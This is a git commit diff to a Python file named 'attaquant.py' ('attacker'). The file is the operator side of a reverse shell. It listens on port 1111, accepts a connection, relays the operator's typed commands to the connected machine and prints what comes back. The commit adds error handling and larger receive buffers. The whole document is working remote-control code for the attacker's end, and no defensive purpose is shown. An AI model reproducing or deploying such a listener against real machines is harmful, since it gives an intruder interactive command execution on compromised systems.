9778de28e9cd6c082a8abe451f7e62cac59441c9
yaya7211 <43450496+yaya7211@users.noreply.github.com>
2019-08-22 18:36:18 +0200

    Update attaquant.py

--- attaquant.py
+++ attaquant.py
@@ -4,11 +4,15 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.bind(('', 1111))
 s.listen(5)
 client, infos = s.accept()
+
 while True:
-	a = client.recv(1024)
-	a = a.decode()
-	a = a+"> "
-	send = input(a)
-	client.send(send.encode())
-	recu = client.recv(1024)
-	print(recu.decode())
+	try:
+		cd = client.recv(10000000)
+		send = input(cd.decode()+"> ")
+		client.send(send.encode())
+		recu = client.recv(10000000)
+		print(recu.decode())
+	except KeyboardInterrupt:
+		exit()
+	except Exception as e:
+		print(e)
